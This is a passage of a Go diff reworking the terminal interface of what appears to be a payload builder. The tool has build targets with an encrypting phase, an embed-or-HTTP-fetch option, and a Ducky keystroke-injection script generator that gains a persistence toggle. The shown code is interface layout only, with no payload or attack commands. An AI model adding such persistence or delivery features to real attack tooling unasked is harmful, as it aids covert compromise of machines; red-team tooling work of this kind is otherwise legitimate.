+		}
+		return target
+	}
+}
+
 // copyToClipboard copies text using xclip/xsel/wl-copy
 func copyToClipboard(text string) error {
 	// Try xclip first, then xsel, then wl-copy
@@ -1339,59 +1509,64 @@ func copyToClipboard(text string) error {
 	return fmt.Errorf("no clipboard tool available")
 }
 
-func (m TUIModel) View() string {
+func (m TUIModel) View() tea.View {
+	var content string
+
 	if m.width < 80 || m.height < 24 {
-		return lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Center,
+		content = lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Center,
 			styleError.Render("Terminal too small (need 80x24)"))
+	} else if m.modal != ModalNone {
+		content = m.viewModal()
+	} else {
+		// Header with tabs
+		header := m.viewTabs()
+
+		// Main content based on active tab
+		var mainContent string
+		switch m.activeTab {
+		case TabBuild:
+			mainContent = m.viewBuildTab()
+		case TabDucky:
+			mainContent = m.viewDuckyTab()
+		case TabServer:
+			mainContent = m.viewServerTab()
+		case TabPackage:
+			mainContent = m.viewPackageTab()
+		}
+
+		// Right sidebar with status indicators
+		sidebar := m.viewSidebar()
+
+		// Two-column layout - fixed widths
+		body := lipgloss.JoinHorizontal(lipgloss.Top, mainContent, "  ", sidebar)
+
+		// Footer - constrain status width to prevent layout overflow
+		statusStyle := lipgloss.NewStyle().MaxWidth(viewportW - 4).Align(lipgloss.Center)
+		footer := lipgloss.JoinVertical(lipgloss.Center,
+			statusStyle.Render(m.status),
+			m.help.View(m.keys),
+		)
+
+		// Fixed viewport container
+		viewport := lipgloss.NewStyle().
+			Width(viewportW).
+			Align(lipgloss.Center)
+
+		content = viewport.Render(lipgloss.JoinVertical(lipgloss.Center,
+			header,
+			"",
+			body,
+			"",
+			footer,
+		))
+
+		content = lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Center, content)
 	}
 
-	// Render modal if active
-	if m.modal != ModalNone {
-		return m.viewModal()
-	}
-
-	// Header with tabs
-	header := m.viewTabs()
-
-	// Main content based on active tab
-	var mainContent string
-	switch m.activeTab {
-	case TabBuild:
-		mainContent = m.viewBuildTab()
-	case TabDucky:
-		mainContent = m.viewDuckyTab()
-	case TabServer:
-		mainContent = m.viewServerTab()
-	case TabPackage:
-		mainContent = m.viewPackageTab()
-	}
-
-	// Right sidebar with status indicators
-	sidebar := m.viewSidebar()
-
-	// Two-column layout - fixed widths
-	body := lipgloss.JoinHorizontal(lipgloss.Top, mainContent, "  ", sidebar)
-
-	// Footer
-	footer := lipgloss.JoinVertical(lipgloss.Center,
-		styleStatus.Render(m.status),
-		m.help.View(m.keys),
-	)
-
-	// Fixed viewport container
-	viewport := lipgloss.NewStyle().
-		Width(viewportW).
-		Align(lipgloss.Center)
-
-	content := viewport.Render(lipgloss.JoinVertical(lipgloss.Center,
-		header,
-		"",
-		body,
-		"",
-		footer,
-	))
-
-	return lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Center, content)
+	v := tea.NewView(content)
+	v.AltScreen = true
+	// ponytail: mouse disabled, add bubblezone later for proper click zones
+	return v
 }
 
 func (m TUIModel) viewSidebar() string {
@@ -1504,77 +1679,51 @@ func (m TUIModel) viewTabs() string {
 	)
 }
 
-func progressBar(percent float64, width int) string {
-	if percent < 0 {
-		percent = 0
-	}
-	if percent > 1 {
-		percent = 1
-	}
-	filled := int(percent*float64(width) + 0.5)
-	// lipgloss styled: amber for filled, dim for empty
-	filledStyle := lipgloss.NewStyle().Foreground(colorAmber)
-	emptyStyle := lipgloss.NewStyle().Foreground(colorStone600)
-	return filledStyle.Render(strings.Repeat("█", filled)) +
-		emptyStyle.Render(strings.Repeat("░", width-filled))
-}
-
 func (m TUIModel) viewBuildProgress() string {
 	if m.buildState == BuildIdle && len(m.buildProgress) == 0 {
 		return ""
 	}
 
-	title := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Build Progress")
+	title := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Build")
+	rows := []string{title}
 
-	var rows []string
 	for _, p := range m.buildProgress {
-		var percent float64
-		switch p.Phase {
-		case "compiling":
-			percent = 0.3
-		case "packaging":
-			percent = 0.6
-		case "encrypting":
-			percent = 0.8
-		case "done":
-			percent = 1.0
-		default:
-			percent = 0.1
-		}
-
-		bar := progressBar(percent, 20)
-		status := p.Phase
-		style := lipgloss.NewStyle().Foreground(colorStone50)
+		shortName := shortTargetName(p.Target)
+		var indicator, status string
+		var style lipgloss.Style
 
 		if p.Done {
 			if p.Error != "" {
-				status = "X " + p.Error
-				style = style.Foreground(colorRose)
+				indicator = styleError.Render("✗")
+				status = "failed"
+				style = lipgloss.NewStyle().Foreground(colorRose)
 			} else {
-				status = "OK"
-				style = style.Foreground(colorEmerald)
+				indicator = styleSuccess.Render("✓")
+				status = "done"
+				style = lipgloss.NewStyle().Foreground(colorEmerald)
 			}
+		} else {
+			indicator = m.buildSpinner.View()
+			status = p.Phase
+			style = lipgloss.NewStyle().Foreground(colorStone400)
 		}
 
-		row := fmt.Sprintf("  %-10s [%s]  %s", p.Target, bar, style.Render(status))
+		row := fmt.Sprintf("%s %-13s %s", indicator, shortName, style.Render(status))
 		rows = append(rows, row)
 	}
 
-	// Log hint - show last line + "l" to open modal
+	// Log hint
 	if len(m.buildLogs) > 0 {
 		lastLine := m.buildLogs[len(m.buildLogs)-1]
-		if len(lastLine) > 50 {
-			lastLine = lastLine[:47] + "..."
+		if len(lastLine) > 40 {
+			lastLine = lastLine[:37] + "..."
 		}
-		rows = append(rows, "")
-		rows = append(rows, "  "+styleStatus.Render(lastLine))
-		rows = append(rows, "  "+styleStatus.Render("(l to view logs)"))
+		rows = append(rows, styleStatus.Render(lastLine)+" (l=logs)")
 	}
 
 	content := lipgloss.JoinVertical(lipgloss.Left, rows...)
-	return styleBox.Width(mainBoxW).Render(
-		lipgloss.JoinVertical(lipgloss.Left, title, "", content),
-	)
+	// ponytail: use MaxWidth to avoid overflow, let content determine actual width
+	return styleBox.MaxWidth(mainBoxW).Render(content)
 }
 
 func (m TUIModel) viewBuildTab() string {
@@ -1582,18 +1731,51 @@ func (m TUIModel) viewBuildTab() string {
 	targetTitle := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Targets")
 	targetContent := m.targetList.View()
 
+	// Embed toggle
+	embedStyle := lipgloss.NewStyle().Foreground(colorStone400)
+	if m.buildFocus == 1 {
+		embedStyle = lipgloss.NewStyle().Foreground(colorAmber).Bold(true)
+	}
+	embedCheck := "[ ]"
+	embedLabel := "HTTP fetch"
+	if m.embedAsset {
+		embedCheck = "[x]"
+		embedLabel = "Embed asset"
+	}
+	embedRow := embedStyle.Render(embedCheck + " " + embedLabel)
+
+	// Docker toggle
+	dockerStyle := lipgloss.NewStyle().Foreground(colorStone400)
+	if m.buildFocus == 2 {
+		dockerStyle = lipgloss.NewStyle().Foreground(colorAmber).Bold(true)
+	}
+	dockerCheck := "[ ]"
+	dockerLabel := "Native (cargo)"
+	if m.dockerBuild {
+		dockerCheck = "[x]"
+		dockerLabel = "Docker build"
+	}
+	dockerRow := dockerStyle.Render(dockerCheck + " " + dockerLabel)
+
+	// Options row (both toggles on same line)
+	optionsRow := lipgloss.JoinHorizontal(lipgloss.Left, embedRow, "    ", dockerRow)
+
 	// Build button
 	btnStyle := lipgloss.NewStyle().Foreground(colorStone400)
-	if m.buildFocus == 1 {
+	if m.buildFocus == 3 {
 		btnStyle = lipgloss.NewStyle().Foreground(colorAmber).Bold(true)
 	}
 	buildBtn := btnStyle.Render("[ Build Selected ]")
 	if m.buildMsg != "" {
-		buildBtn += "  " + m.buildMsg
+		msg := m.buildMsg
+		if len(msg) > 40 {
+			msg = msg[:37] + "..."
+		}
+		buildBtn += "  " + msg
 	}
 
 	targetsBox := styleBox.Width(mainBoxW).Render(
-		lipgloss.JoinVertical(lipgloss.Left, targetTitle, "", targetContent, "", buildBtn),
+		lipgloss.JoinVertical(lipgloss.Left, targetTitle, "", targetContent, "", optionsRow, "", buildBtn),
 	)
 
 	// Asset info box
@@ -1619,7 +1801,7 @@ func (m TUIModel) viewDuckyTab() string {
 	title := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Ducky Script Generator")
 
 	// Build rows with proper alignment
-	rows := make([]string, 3)
+	rows := make([]string, 4)
 
 	// OS row
 	osLabel := styleLabel.Render("Target OS:")
@@ -1647,9 +1829,22 @@ func (m TUIModel) viewDuckyTab() string {
 	}
 	rows[2] = lipgloss.JoinHorizontal(lipgloss.Left, payloadLabel, " ", payloadValue)
 
+	// Persist toggle row
+	persistLabel := styleLabel.Render("Persist:")
+	persistCheck := "[ ]"
+	if m.duckyPersist {
+		persistCheck = "[x]"
+	}
+	persistStyle := styleValue
+	if m.duckyFocus == 3 {
+		persistStyle = styleFocusedValue
+		persistCheck += "  [space to toggle]"
+	}
+	rows[3] = lipgloss.JoinHorizontal(lipgloss.Left, persistLabel, persistStyle.Render(persistCheck))
+
 	// Generate button
 	btnStyle := lipgloss.NewStyle().Foreground(colorStone400)
-	if m.duckyFocus == 3 {
+	if m.duckyFocus == 4 {
 		btnStyle = lipgloss.NewStyle().Foreground(colorAmber).Bold(true)
 	}
 	genBtn := btnStyle.Render("[ Generate Script ]")
@@ -1809,7 +2004,7 @@ func (m TUIModel) viewModal() string {
 	case ModalAssets:
 		title = "Assets"
 		content = m.assetList.View()
-		content += "\n\n[n] add new  [enter] select  [esc] close"
+		content += "\n\n[n] add  [p] preview  [d] delete  [enter] select  [esc] close"
 
 	case ModalFilePicker:
 		title = "Add Asset"
@@ -1861,15 +2056,10 @@ func (m TUIModel) viewModal() string {
 
 	case ModalBuildLogs:
 		title = "Build Logs"
-		// Show last 20 lines of build logs
-		logLines := m.buildLogs
-		if len(logLines) > 20 {
-			logLines = logLines[len(logLines)-20:]
-		}
-		if len(logLines) == 0 {
+		if len(m.buildLogs) == 0 {
 			content = "(no build output)"
 		} else {
-			content = strings.Join(logLines, "\n")
+			content = m.logViewport.View()
 		}
 		content += "\n\n[c] copy  [esc] close"
 
@@ -1880,6 +2070,20 @@ func (m TUIModel) viewModal() string {
 			"",
 			styleStatus.Render("[enter] confirm  [esc] cancel"),
 		)
+
+	case ModalPreview:
+		title = "Asset Preview"
+		if m.assetPreview != nil {
+			content = m.assetPreview.View()
+		} else {
+			content = "(no preview)"
+		}
+		content += "\n\n" + styleStatus.Render(m.selectedAsset) + "\n" + styleStatus.Render("[p/esc] close")
+
+	case ModalDuckyPreview:
+		title = "Ducky Script Preview"
+		content = m.genDuckyPreview()
+		content += "\n\n[c] copy  [p/esc] close"
 	}
 
 	modalW := min(viewportW-10, m.width-10)
